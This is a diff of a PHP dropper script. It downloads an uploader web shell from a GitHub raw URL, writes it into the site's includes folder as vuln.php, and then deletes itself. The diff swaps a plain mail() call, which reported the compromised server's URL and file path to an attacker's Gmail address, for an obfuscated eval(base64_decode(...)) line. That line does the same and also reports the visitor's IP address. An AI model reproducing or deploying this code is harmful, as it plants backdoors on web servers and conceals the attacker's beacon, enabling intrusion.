@@ -9,7 +9,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
+$check = $_SERVER['DOCUMENT_ROOT'] . "/includes/vuln.php" ;
 $text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
@@ -30,19 +30,6 @@ if(file_exists($check2)){
   echo "not exits";
 echo "done .\n " ;
 @unlink(__FILE__);
-$site = "";
-if(!ereg($site, $_SERVER['SERVER_NAME']))
-{
-    $to = "kalix0xalik@gmail.com";
-    $subject = "FRESH MAILLERS";
-    $header = "from: BoT <adredf151@webmail.com>";
-    $message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "
-";
-    $message .= "Path : " . __file__;
-    $sentmail = @mail($to, $subject, $message, $header);
-    
-    echo "";
-    exit;
-}
+eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
 
 ?>
